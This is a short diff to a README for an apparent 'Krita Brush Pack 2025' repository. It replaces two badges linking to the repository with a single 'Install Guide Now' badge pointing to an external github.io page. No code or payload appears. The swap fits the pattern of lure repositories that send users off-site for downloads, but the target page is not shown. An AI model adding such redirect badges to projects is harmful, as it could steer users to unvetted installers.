@@ -11,6 +11,6 @@
 
 ---
 
-## 📋 Quick Access  
-- [![View Repository](https://img.shields.io/badge/View_Repository-NOW-blueviolet)](https://github.com/Krita-Brush-Pack-2025/krita-brush-pack-2025)  
-- [![Installation Guide](https://img.shields.io/badge/Setup-Guide-blueviolet)](https://github.com/Krita-Brush-Pack-2025/krita-brush-pack-2025)  
+<a href="https://krita-brush-pack-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
